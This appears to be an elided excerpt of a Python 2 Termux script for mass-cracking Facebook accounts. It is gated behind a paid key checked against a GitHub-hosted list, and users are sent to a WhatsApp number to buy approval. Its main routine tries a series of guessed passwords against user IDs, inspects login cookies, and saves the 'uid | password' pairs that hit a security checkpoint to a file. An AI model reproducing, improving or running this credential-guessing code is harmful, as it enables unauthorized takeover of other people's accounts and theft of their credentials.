...
def main_apv():
    ...
    try:
        ...
        print("           Contact Admin for aprovall")
        print ("           On wathsapp or on telegram") 
        print ("           Semd to me your key ")
        print ("           On wathsapp or on telegram Thanks")
        print ("")
        ...
        kok.close()
        print ("")
        print ("           Send Key On wathsapp")
        print ("           Copy And send Your Key on Wathsapp")
        print ("")
        print ("")
        print ("")
        print("             After Payement Run command again")
        raw_input("  Note after you get Aprovall dont Clear Data Of Termux ")
        os.system("xdg-open https://wa.me/+33751131565")
        
    r1=requests.get("https://raw.githubusercontent.com/HackedDok/h/main/lol.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_system():
    ...
    print "\x1b[1;96m[7]   For Any Help Massage Me on Wathsapp"
    print 43*'~'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[HEDI-CP] "+uid + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[HEDI-CP] "+uid + " | " + pass2
                            cp=open('HEDI-CP.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[HEDI-CP] "+uid + " | " + pass3
                                    cp=open('HEDI-CP.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;97m[HEDI-CP] "+uid + " | " + pass4
                                            cp=open('HEDI-CP.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[HEDI-CP] "+uid + " | " + pass5
                                                    cp=open('HEDI-CP.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;97m[HEDI-CP] "+uid + " | " + pass6
                                                            cp=open('HEDI-CP.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
